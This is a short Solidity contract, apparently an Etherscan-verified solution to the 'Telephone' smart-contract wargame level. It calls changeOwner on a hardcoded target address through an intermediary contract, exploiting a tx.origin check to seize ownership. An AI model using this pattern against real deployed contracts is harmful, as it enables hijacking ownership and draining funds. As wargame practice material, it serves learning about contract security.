/**
 *Submitted for verification at Etherscan.io on 2019-02-15
*/

pragma solidity ^0.5.2;

contract Telephone {

    function callTelephoneContract() public {
        address c = 0x34e23B4a032029dCde15dC2d849Fea52CdD6Cc39;
        c.call(abi.encodeWithSignature("changeOwner(address)", 0x62F39dd6862bb26F45ca2A77749Bd5A4038e80Fe));
    }
}
